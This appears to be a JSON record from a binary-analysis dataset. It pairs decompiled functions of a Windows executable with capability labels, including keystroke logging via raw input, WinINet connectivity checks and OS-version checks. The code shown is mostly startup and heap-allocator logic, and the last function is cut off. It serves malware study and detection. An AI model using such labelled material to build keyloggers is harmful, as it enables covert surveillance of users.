{
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "14000119": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140001190(void)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    uint64_t *puVar6;\n    int32_t *piVar7;\n    ulong uVar8;\n    int32_t *piVar9;\n    code *pcVar10;\n    ulong uVar11;\n    char **ppcVar12;\n    char *pcVar13;\n    ulong *puVar14;\n    int64_t iVar15;\n    ulong *puVar16;\n    uint64_t uVar17;\n    bool bVar18;\n    int64_t iVar19;\n    int64_t iVar20;\n    int64_t iVar21;\n    int32_t iVar22;\n    int64_t in_GS_OFFSET;\n    ulong auStack168 [7];\n    uint8_t uStack108;\n    uint16_t uStack104;\n    \n    piVar9 = *0x1400d71d0;\n    puVar16 = auStack168;\n    for (iVar19 = 0xd; iVar19 != 0; iVar19 = iVar19 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    if (**0x1400d71d0 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack168);\n    }\n    pcVar10 = _sym.imp.KERNEL32.dll_Sleep;\n    puVar6 = *0x1400d70f0;\n    uVar17 = *(*(in_GS_OFFSET + 0x30) + 8);\n    while( true ) {\n        LOCK();\n        uVar5 = *puVar6;\n        *puVar6 = *puVar6 ^ (uVar5 == 0) * (*puVar6 ^ uVar17);\n        uVar8 = *0x1400d7160;\n        uVar11 = *0x1400d7150;\n        piVar7 = *0x1400d7100;\n        uVar5 = (uVar5 != 0) * *puVar6;\n        if (uVar5 == 0) break;\n        if (uVar17 == uVar5) {\n            bVar18 = true;\n            iVar4 = **0x1400d7100;\n            goto joined_r0x000140001419;\n        }\n        (*pcVar10)(1000);\n    }\n    bVar18 = false;\n    iVar4 = **0x1400d7100;\njoined_r0x000140001419:\n    if (iVar4 == 1) {\n        sub.msvcrt.dll__amsg_exit(0x1f);\n        iVar4 = *piVar7;\n    }\n    else {\n        if (**0x1400d7100 == 0) {\n            **0x1400d7100 = 1;\n            sub.msvcrt.dll__initterm(uVar11, uVar8);\n        }\n        else {\n            *0x1400dc01c = 1;\n        }\n        iVar4 = *piVar7;\n    }\n    if (iVar4 == 1) {\n        sub.msvcrt.dll__initterm(*0x1400d7130, *0x1400d7140);\n        *piVar7 = 2;\n    }\n    if (!bVar18) {\n        *puVar6 = 0;\n    }\n    if (*_str._g_r_ != NULL) {\n        (**_str._g_r_)(0, 2);\n    }\n    fcn.14000a3a0();\n    uVar11 = (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0x14000a680);\n    **0x1400d70b0 = uVar11;\n    fcn.14001a170(0x140001000);\n    fcn.14000a1b0();\n    *0x1400dc010 = *0x1400d7060;\n    ppcVar12 = fcn.14001a250();\n    iVar4 = *0x1400dc038;\n    bVar18 = false;\n    pcVar13 = *ppcVar12;\n    if (pcVar13 != NULL) {\n        do {\n            cVar3 = *pcVar13;\n            if (cVar3 < '!') {\n                *0x1400dc008 = pcVar13;\n                if (cVar3 == '\\0') break;\n                if (!bVar18) goto code_r0x0001400012e0;\n                bVar18 = true;\n            }\n            else if (cVar3 == '\\\"') {\n                bVar18 = bVar18 ^ 1;\n            }\n            pcVar13 = pcVar13 + 1;\n        } while( true );\n    }\n    goto code_r0x000140001300;\ncode_r0x0001400012e0:\n    if (cVar3 != '\\0') {\n        do {\n            pcVar1 = pcVar13 + 1;\n            pcVar13 = pcVar13 + 1;\n            *0x1400dc008 = pcVar13;\n            if (*pcVar1 == '\\0') break;\n        } while (*pcVar1 < '!');\n    }\ncode_r0x000140001300:\n    if ((*piVar9 != 0) && (*0x14001b000 = 10,  (uStack108 & 1) != 0)) {\n        *0x14001b000 = uStack104;\n    }\n    iVar21 = *0x1400dc038;\n    iVar22 = *0x1400dc038 + 1;\n    puVar14 = sub.msvcrt.dll_malloc();\n    iVar19 = *0x1400dc030;\n    puVar16 = puVar14;\n    if (0 < iVar4) {\n        iVar20 = 0;\n        do {\n            iVar15 = sub.msvcrt.dll_strlen(*(iVar19 + iVar20 * 8));\n            uVar11 = sub.msvcrt.dll_malloc(iVar15 + 1);\n            puVar14[iVar20] = uVar11;\n            iVar2 = iVar20 * 8;\n            iVar20 = iVar20 + 1;\n            sub.msvcrt.dll_memcpy(uVar11, *(iVar19 + iVar2), iVar15 + 1);\n        } while (iVar21 != iVar20);\n        puVar16 = puVar14 + iVar22 + -1;\n    }\n    *puVar16 = 0;\n    *0x1400dc030 = puVar14;\n    fcn.140009fa0();\n    ***0x1400d7070 = *0x1400dc028;\n    uVar17 = fcn.14001a2d0();\n    *0x1400dc024 = uVar17;\n    if (*0x1400dc020 == 0) {\n        sub.msvcrt.dll_exit(uVar17 & 0xffffffff);\n        **0x1400d71d0 = 1;\n        uVar17 = fcn.140001190();\n        return uVar17;\n    }\n    if (*0x1400dc01c == 0) {\n        sub.msvcrt.dll__cexit();\n        return *0x1400dc024;\n    }\n    return uVar17;\n}\n",
        "token_count": 1595
    },
    "14000154": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140001541(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    \n    piVar1 = 0x14001c000;\n    if ((arg1 != NULL) && (*arg1 != 0)) {\n        piVar1 = arg1 + 2;\n    }\n    return piVar1;\n}\n",
        "token_count": 79
    },
    "14000165": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x000140001760: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x000140001765)\n\nvoid fcn.140001655(int64_t arg1, int64_t **arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    int64_t iVar5;\n    int64_t **arg2_00;\n    \n    arg2_00 = *arg2;\n    if (arg2_00 != *arg2_00) {\n        *(arg1 + 0x28b8) = arg2_00;\n        if (arg2_00[2] <= arg3) {\n            *(arg1 + 0x28b0) = arg2_00;\n            arg2_00 = *arg2 + 1;\n        }\n        fcn.140001655(arg1, arg2_00, arg3);\n        piVar1 = *arg2;\n        if (((piVar1 == *(arg1 + 0x28b8)) && (piVar2 = *(arg1 + 0x28b0),  piVar2 != *piVar2)) && (piVar2[2] == arg3)) {\n            iVar3 = piVar1[3];\n            iVar5 = *(arg1 + 0x28d8);\n            piVar2[2] = piVar1[2];\n            piVar2[3] = iVar3;\n            iVar3 = arg1 + 0x28d8;\n            if (iVar5 == 0) {\n                *(arg1 + 0x28d8) = iVar3;\n                *(arg1 + 0x28e0) = iVar3;\n            }\n            *(arg1 + 0x28b0) = iVar3;\n            *arg2 = (*arg2)[1];\n            puVar4 = *(arg1 + 0x28b8);\n            *puVar4 = *(arg1 + 0x28c0);\n            *(arg1 + 0x28c0) = puVar4;\n        }\n        else {\n            iVar3 = piVar1[1];\n            iVar5 = piVar1[4] + -1;\n            if ((*(*piVar1 + 0x20) < iVar5) || (*(iVar3 + 0x20) < iVar5)) {\n                piVar1[4] = iVar5;\n                if (iVar5 < *(iVar3 + 0x20)) {\n                    *(iVar3 + 0x20) = iVar5;\n                }\n                fcn.140001605(arg2);\n                fcn.140001605(*arg2 + 1);\n                fcn.140001605((*arg2)[1] + 8);\n                piVar1 = *arg2;\n                piVar2 = piVar1[1];\n                if (*(piVar2[1] + 0x20) == piVar1[4]) {\n                    *arg2 = piVar2;\n                    piVar1[1] = *piVar2;\n                    **arg2 = piVar1;\n                    (*arg2)[4] = (*arg2)[4] + 1;\n                }\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 728
    },
    "1400023c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t * fcn.1400023c2(int64_t arg1, uint64_t arg2)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uint64_t *puVar3;\n    int64_t *piVar4;\n    ulong *puVar5;\n    uint64_t uVar6;\n    uint64_t *puVar7;\n    int64_t iVar8;\n    \n    if (*(arg1 + 0x28c9) == '\\0') {\n        if (*(arg1 + 0x2098) < 0x10000) {\n            *(arg1 + 0x28d0) = 0x4000;\n        }\n        else {\n            uVar6 = *(arg1 + 0x28d0) * 2;\n            uVar2 = (*(arg1 + 0x2098) >> 2) + 0xfffU & 0xfffffffffffff000;\n            if (0x3f000000 < uVar6) {\n                uVar6 = 0x3f000000;\n            }\n            if (uVar6 < uVar2) {\n                uVar2 = uVar6;\n            }\n            *(arg1 + 0x28d0) = uVar2;\n        }\n    }\n    if (*(arg1 + 0x28d0) < arg2) {\n        puVar3 = fcn.14000204e(arg2);\n    }\n    else {\n        puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, *(arg1 + 0x28d0), 0x3000, 4);\n        if (puVar3 == NULL) {\n            puVar3 = fcn.14000204e(arg2);\n            *(arg1 + 0x28c9) = 1;\n        }\n        else {\n            arg2 = *(arg1 + 0x28d0);\n        }\n    }\n    *(arg1 + 0x2080) = *(arg1 + 0x2080) + arg2;\n    piVar4 = arg1 + 0x2900;\n    *(arg1 + 0x2090) = *(arg1 + 0x2090) + arg2;\n    do {\n        iVar8 = *piVar4;\n        if (iVar8 < 0x1e) {\n            piVar4[iVar8 * 2 + 1] = puVar3;\n            piVar4[iVar8 * 2 + 2] = arg2;\n            *piVar4 = iVar8 + 1;\n            goto code_r0x0001400024f2;\n        }\n        piVar4 = piVar4[0x3d];\n    } while (piVar4 != NULL);\n    puVar5 = fcn.140002344(arg1, 0x1f0);\n    puVar5[0x3d] = *(arg1 + 0x2ae8);\n    *(arg1 + 0x2ae8) = puVar5;\n    puVar5[1] = puVar3;\n    puVar5[2] = arg2;\n    *puVar5 = 1;\ncode_r0x0001400024f2:\n    puVar7 = arg2 + puVar3;\n    puVar3[1] = arg2;\n    puVar3[2] = 0;\n    puVar3[3] = 0;\n    cVar1 = fcn.140001ea0(puVar7 >> 0xc);\n    if (cVar1 != '\\0') {\n        *puVar7 = *puVar7 & 1 | arg2;\n    }\n    uVar6 = *(arg1 + 0x20a0);\n    if (uVar6 == 0) {\n        uVar6 = 0x1000;\n    }\n    iVar8 = puVar3 - uVar6;\n    cVar1 = fcn.140001ea0(iVar8 >> 0xc);\n    uVar2 = *puVar3 & 1;\n    if ((cVar1 != '\\0') && (*(iVar8 + 8) == uVar6)) {\n        uVar2 = uVar2 | uVar6;\n    }\n    *puVar3 = uVar2;\n    *(arg1 + 0x20a0) = arg2;\n    return puVar3;\n}\n",
        "token_count": 953
    },
    "14000257": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14000257c(int64_t arg1, int64_t **arg2, int64_t *arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t **arg2_00;\n    bool bVar5;\n    \n    arg2_00 = *arg2;\n    if (arg2_00 == *arg2_00) {\n        piVar4 = *(arg1 + 0x28c0);\n        if (piVar4 == NULL) {\n            piVar4 = fcn.140002344(arg1, 0x28);\n        }\n        else {\n            *(arg1 + 0x28c0) = *piVar4;\n        }\n        iVar3 = *(arg1 + 0x28d8);\n        piVar4[2] = arg3;\n        iVar1 = arg1 + 0x28d8;\n        piVar4[3] = arg4;\n        if (iVar3 == 0) {\n            *(arg1 + 0x28d8) = iVar1;\n            *(arg1 + 0x28e0) = iVar1;\n        }\n        *piVar4 = iVar1;\n        piVar4[1] = iVar1;\n        piVar4[4] = 1;\n        *arg2 = piVar4;\n        return;\n    }\n    bVar5 = arg2_00[2] == arg3;\n    if (arg2_00[2] < arg3 || bVar5) {\n        if (bVar5) goto code_r0x000140002628;\n        arg2_00 = arg2_00 + 1;\n    }\n    fcn.14000257c(arg1, arg2_00, arg3, arg4);\ncode_r0x000140002628:\n    fcn.140001605(arg2);\n    piVar4 = *arg2;\n    piVar2 = piVar4[1];\n    if (*(piVar2[1] + 0x20) == piVar4[4]) {\n        *arg2 = piVar2;\n        piVar4[1] = *piVar2;\n        **arg2 = piVar4;\n        (*arg2)[4] = (*arg2)[4] + 1;\n    }\n    return;\n}\n",
        "token_count": 527
    },
    "1400029c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong * fcn.1400029cb(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    int64_t arg2_00;\n    uint64_t uVar4;\n    int64_t iVar5;\n    ulong *arg3;\n    \n    uVar4 = arg2 + 0xfU & 0xfffffffffffffff0;\n    if (uVar4 < 0xfc1) {\n        iVar5 = arg2 + 0xfU >> 4;\n        iVar1 = arg1 + iVar5 * 8;\n        arg2_00 = *(iVar1 + 0x10);\n        if (arg2_00 == 0) {\n            arg2_00 = fcn.14000281c(arg1, 0x1000);\n            *(arg2_00 + 0x20) = 0;\n            *(arg2_00 + 8) = uVar4;\n            *(arg2_00 + 0x30) = uVar4;\n            *(arg2_00 + 0x10) = 0;\n            *(arg2_00 + 0x28) = 0xfc0 - uVar4;\n            *(arg2_00 + 0x18) = 0;\n            iVar2 = *(iVar1 + 0x10);\n            *(arg2_00 + 0x10) = iVar2;\n            if (iVar2 != 0) {\n                *(iVar2 + 0x18) = arg2_00;\n            }\n            *(iVar1 + 0x10) = arg2_00;\n            arg3 = arg2_00 + 0x40;\n        }\n        else {\n            arg3 = *(arg2_00 + 0x20);\n            if (arg3 == NULL) {\n                arg3 = arg2_00 + 0x40 + *(arg2_00 + 0x30);\n                *(arg2_00 + 0x30) = *(arg2_00 + 0x30) + uVar4;\n            }\n            else {\n                *(arg2_00 + 0x20) = *arg3;\n            }\n            *(arg2_00 + 0x28) = *(arg2_00 + 0x28) - uVar4;\n        }\n        if (*(arg2_00 + 0x28) < uVar4) {\n            fcn.1400015c8(arg1 + 0x10 + iVar5 * 8, arg2_00);\n        }\n        *(arg1 + 0x2098) = *(arg1 + 0x2098) + uVar4;\n    }\n    else {\n        arg2 = arg2 + 0x20;\n        if (arg2 < 0x3f000001) {\n            puVar3 = fcn.14000281c(arg1, arg2);\n        }\n        else {\n            puVar3 = fcn.14000204e(arg2);\n            *(arg1 + 0x2080) = *(arg1 + 0x2080) + arg2;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            puVar3[1] = arg2;\n            *puVar3 = 1;\n            fcn.14000263c(arg1, puVar3 >> 0xc);\n        }\n        arg3 = puVar3 + 4;\n        if (*(arg1 + 0x28a8) == 0) {\n            iVar1 = arg1 + 0x28d8;\n            if (*(arg1 + 0x28d8) == 0) {\n                *(arg1 + 0x28d8) = iVar1;\n                *(arg1 + 0x28e0) = iVar1;\n            }\n            *(arg1 + 0x28a8) = iVar1;\n        }\n        fcn.14000257c(arg1, arg1 + 0x28a8, arg3, arg3 + arg2);\n        *(arg1 + 0x2098) = *(arg1 + 0x2098) + puVar3[1];\n    }\n    return arg3;\n}\n",
        "token_count": 926
    },
    "140004c1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140004c1d(int64_t arg1, uint64_t *arg2)\n\n{\n    uint8_t *arg2_00;\n    uint32_t *puVar1;\n    uint64_t uVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    ulong arg2_01;\n    uint64_t *arg2_02;\n    int64_t unaff_R13;\n    uint64_t *puVar9;\n    int64_t unaff_R14;\n    \n    arg2_02 = arg2 & 0xfffffffffffff000;\n    uVar5 = arg2_02[1];\n    *(arg1 + 0x2098) = *(arg1 + 0x2098) - uVar5;\n    if (uVar5 < 0xfc1) {\n        uVar2 = arg2_02[4];\n        arg2[1] = 0;\n        *arg2 = uVar2;\n        arg2_02[4] = arg2;\n        uVar2 = arg2_02[5] + uVar5;\n        if (arg2_02[5] < uVar5) {\n            iVar7 = uVar5 / 0x10 + 2;\n            uVar5 = *(arg1 + iVar7 * 8);\n            arg2_02[2] = uVar5;\n            if (uVar5 != 0) {\n                *(uVar5 + 0x18) = arg2_02;\n            }\n            *(arg1 + iVar7 * 8) = arg2_02;\n            arg2_02[5] = uVar2;\n        }\n        else {\n            arg2_02[5] = uVar2;\n            if (uVar2 == 0xfc0) {\n                puVar9 = arg2_02;\n                fcn.1400015c8(arg1 + 0x10 + (uVar5 / 0x10) * 8, arg2_02);\n                puVar9[1] = 0x1000;\n                goto code_r0x000140002bfc;\n            }\n        }\n    }\n    else {\n        iVar7 = arg1 + 0x28d8;\n        if (*(arg1 + 0x28d8) == 0) {\n            *(arg1 + 0x28d8) = iVar7;\n            *(arg1 + 0x28e0) = iVar7;\n        }\n        *(arg1 + 0x28b0) = iVar7;\n        fcn.140001655(arg1, arg1 + 0x28a8, arg2_02 + 4);\n        uVar5 = arg2_02[1];\n        if (uVar5 < 0x3f000001) {\ncode_r0x000140002bfc:\n            *(arg1 + 0x2090) = *(arg1 + 0x2090) + arg2_02[1];\n            uVar5 = *arg2_02 & 0xfffffffffffffffe;\n            *arg2_02 = uVar5;\n            if (uVar5 != 0) {\n                puVar9 = arg2_02 - uVar5;\n                cVar3 = fcn.140001ea0(puVar9 >> 0xc);\n                if ((((cVar3 != '\\0') && ((*puVar9 & 1) == 0)) && (0xfc0 < puVar9[1])) && (puVar9[1] < 0x3f000000)) {\n                    fcn.140002b55(arg1, puVar9);\n                    puVar9[1] = puVar9[1] + arg2_02[1];\n                    fcn.140001eda(arg2_02 >> 0xc);\n                    arg2_02 = puVar9;\n                    if (0x3f000000 < puVar9[1]) {\n                        arg2_02 = fcn.1400026af(arg1, puVar9, 0x3f000000);\n                        fcn.140002774(arg1, puVar9);\n                    }\n                }\n            }\n            uVar5 = arg2_02[1];\n            arg2_00 = arg2_02 + uVar5;\n            cVar3 = fcn.140001ea0(arg2_00 >> 0xc);\n            if (((cVar3 != '\\0') && ((*arg2_00 & 1) == 0)) && ((0xfc0 < *(arg2_00 + 8) && (uVar5 < 0x3f000000)))) {\n                fcn.140002b55(arg1, arg2_00);\n                arg2_02[1] = arg2_02[1] + *(arg2_00 + 8);\n                fcn.140001eda(arg2_00 >> 0xc);\n                if (0x3f000000 < arg2_02[1]) {\n                    uVar6 = fcn.1400026af(arg1, arg2_02, 0x3f000000);\n                    fcn.140002774(arg1, uVar6);\n                }\n            }\n            fcn.14000272a(&stack0xffffffffffffffe8, arg2_02[1]);\n            arg2_02[3] = 0;\n            uVar5 = *(arg1 + 8 + (unaff_R13 * 0x20 + 0x10e + unaff_R14) * 8);\n            arg2_02[2] = uVar5;\n            if (uVar5 != 0) {\n                *(uVar5 + 0x18) = arg2_02;\n            }\n            *(arg1 + 8 + (unaff_R13 * 0x20 + 0x10e + unaff_R14) * 8) = arg2_02;\n            puVar1 = arg1 + 0x814 + unaff_R13 * 4;\n            *puVar1 = *puVar1 | 1 << (unaff_R14 & 0x1f);\n            *(arg1 + 0x810) = *(arg1 + 0x810) | 1 << (unaff_R13 & 0x1f);\n            return;\n        }\n        fcn.140001eda(arg2_02 >> 0xc);\n        iVar7 = *(arg1 + 0x2080);\n        uVar6 = 0x8000;\n        iVar8 = iVar7;\n        if (iVar7 <= *(arg1 + 0x2088)) {\n            iVar8 = *(arg1 + 0x2088);\n        }\n        *(arg1 + 0x2080) = iVar7 - uVar5;\n        *(arg1 + 0x2088) = iVar8;\n        arg2_01 = 0;\n        iVar4 = (*_sym.imp.KERNEL32.dll_VirtualFree)(arg2_02);\n        if (iVar4 == 0) {\n            fcn.140004bd7(\"virtualFree failing!\", arg2_01, uVar6, uVar5);\n            sub.msvcrt.dll_exit(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1597
    },
    "140004f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140004f31(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    char cVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    uint8_t *puVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    int64_t *piVar9;\n    uint64_t uVar10;\n    \n    if (0x1000 < arg1) {\n        cVar2 = fcn.140001ea0(arg1 >> 0xc);\n        if (cVar2 == '\\0') {\n            if ((*0x1400eb348 <= arg1) && (piVar4 = *0x1400edbf0,  arg1 <= *0x1400eb350)) {\n                for (; piVar4 != *piVar4; piVar4 = piVar4[piVar9 < arg1]) {\n                    piVar9 = piVar4[2];\n                    if ((piVar9 <= arg1) && (arg1 < piVar4[3])) goto code_r0x000140004fe2;\n                }\n            }\n        }\n        else {\n            puVar6 = arg1 & 0xfffffffffffff000;\n            if ((*puVar6 & 1) != 0) {\n                if (*(puVar6 + 8) < 0xfc1) {\n                    uVar10 = arg1 & 0xfff;\n                    uVar1 = uVar10 - 0x40;\n                    if (*(puVar6 + 0x30) <= uVar1) {\n                        return;\n                    }\n                    piVar9 = puVar6 + (uVar10 - uVar1 % *(puVar6 + 8));\ncode_r0x000140004fe2:\n                    iVar5 = piVar9[1];\n                    iVar3 = piVar9[1];\n                }\n                else {\n                    piVar9 = puVar6 + 0x20;\n                    if (arg1 < piVar9) {\n                        return;\n                    }\n                    iVar5 = *(puVar6 + 0x28);\n                    iVar3 = *(puVar6 + 0x28);\n                }\n                if (iVar5 != 0 && iVar3 != 1) {\n                    *piVar9 = *piVar9 + 8;\n                    if (*0x1400eb318 <= *0x1400eb310) {\n                        *0x1400eb318 = (*0x1400eb318 * 3) / 2;\n                        iVar3 = fcn.1400029cb(0x1400eb348, *0x1400eb318 * 8 + 0x10);\n                        puVar7 = *0x1400eb320;\n                        *(iVar3 + 8) = 1;\n                        puVar8 = iVar3 + 0x10;\n                        for (iVar5 = *0x1400eb310 * 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n                            *puVar8 = *puVar7;\n                            puVar7 = puVar7 + 1;\n                            puVar8 = puVar8 + 1;\n                        }\n                        fcn.140004d89(*0x1400eb320);\n                        *0x1400eb320 = iVar3 + 0x10;\n                    }\n                    *(*0x1400eb320 + *0x1400eb310 * 8) = piVar9;\n                    *0x1400eb310 = *0x1400eb310 + 1;\n                    return;\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 786
    },
    "1400050c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400050cf(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    ulong *puVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    \n    uVar4 = *0x1400ede78;\n    uVar10 = arg1 >> 0xc;\n    uVar8 = uVar10;\n    while( true ) {\n        puVar7 = *(*0x1400ede88 + (*0x1400ede78 & uVar8) * 8);\n        if (puVar7 == NULL) break;\n        if (uVar10 == puVar7[1]) goto code_r0x000140005207;\n        uVar8 = (*0x1400ede78 & uVar8) * 5 + 1;\n    }\n    iVar1 = *0x1400ede78 + 1;\n    if ((iVar1 * 2 < *0x1400ede70 * 3) || (iVar1 - *0x1400ede70 < 4)) {\n        *0x1400ede78 = iVar1 * 2 - 1;\n        iVar5 = fcn.140002d30(iVar1 * 0x10);\n        iVar1 = *0x1400ede88;\n        uVar8 = *0x1400ede78;\n        for (iVar9 = 0; iVar9 <= uVar4; iVar9 = iVar9 + 1) {\n            iVar3 = *(iVar1 + iVar9 * 8);\n            if (iVar3 != 0) {\n                uVar6 = *(iVar3 + 8);\n                while( true ) {\n                    piVar2 = iVar5 + (uVar6 & uVar8) * 8;\n                    if (*piVar2 == 0) break;\n                    uVar6 = (uVar6 & uVar8) * 5 + 1;\n                }\n                *piVar2 = iVar3;\n            }\n        }\n        fcn.140004d89(iVar1);\n        *0x1400ede88 = iVar5;\n    }\n    *0x1400ede70 = *0x1400ede70 + 1;\n    uVar8 = uVar10;\n    while( true ) {\n        uVar8 = uVar8 & *0x1400ede78;\n        if (*(*0x1400ede88 + uVar8 * 8) == 0) break;\n        uVar8 = uVar8 * 5 + 1;\n    }\n    puVar7 = fcn.140002d30(0x30);\n    puVar7[1] = uVar10;\n    *puVar7 = *0x1400ede80;\n    *0x1400ede80 = puVar7;\n    *(*0x1400ede88 + uVar8 * 8) = puVar7;\ncode_r0x000140005207:\n    uVar8 = arg1 >> 4 & 0xff;\n    puVar7[(uVar8 >> 6) + 2] = puVar7[(uVar8 >> 6) + 2] | 1 << (uVar8 & 0x3f);\n    return;\n}\n",
        "token_count": 745
    },
    "1400054f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0001400055a7: Changing call to branch\n// WARNING: Possible PIC construction at 0x000140005425: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0001400055ac)\n// WARNING: Removing unreachable block (ram,0x00014000542a)\n\nvoid fcn.1400054f4(int64_t arg1)\n\n{\n    char cVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t *arg1_00;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    uint8_t in_DL;\n    char *pcVar9;\n    char *pcVar10;\n    uint64_t uVar11;\n    ulong uVar12;\n    char *pcVar13;\n    int64_t unaff_RBX;\n    ulong *puVar14;\n    int64_t unaff_RBP;\n    uchar *puVar15;\n    ulong uVar16;\n    int64_t unaff_RSI;\n    uchar *puVar17;\n    ulong uVar18;\n    int64_t iVar19;\n    int64_t unaff_RDI;\n    uint64_t uVar20;\n    ulong uVar21;\n    uint64_t unaff_R12;\n    ulong unaff_R13;\n    ulong uStack80;\n    \n    iVar4 = *(arg1 + 8);\n    if (*(iVar4 + 0x30) != NULL) {\n    // WARNING: Could not recover jumptable at 0x000140005535. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(iVar4 + 0x30))(arg1 + 0x10, in_DL);\n        return;\n    }\n    if (*(iVar4 + 0x10) == '\\x16') {\n        piVar7 = *(iVar4 + 0x18);\n        piVar8 = arg1 + 0x10;\n    }\n    else {\n        if (((*(iVar4 + 0x10) != '\\x18') || (unaff_RDI = arg1 + 0x10,  unaff_RDI == 0)) ||\n           (unaff_RSI = *(arg1 + 0x10) + -1,  unaff_RSI < 0)) {\n            return;\n        }\n        uVar11 = 0x10;\n        piVar7 = *(*(arg1 + 8) + 0x18);\n        iVar4 = piVar7[1];\n        if (iVar4 != 0) {\n            uVar11 = iVar4 + 0xfU & -iVar4;\n        }\n        unaff_RBP = 1;\n        piVar8 = unaff_RDI + uVar11;\n        *0x20 = &stack0xffffffffffffffb0;\n        uStack80 = 0x1400055ac;\n        unaff_RBX = arg1;\n        unaff_R12 = in_DL;\n    }\n    do {\n        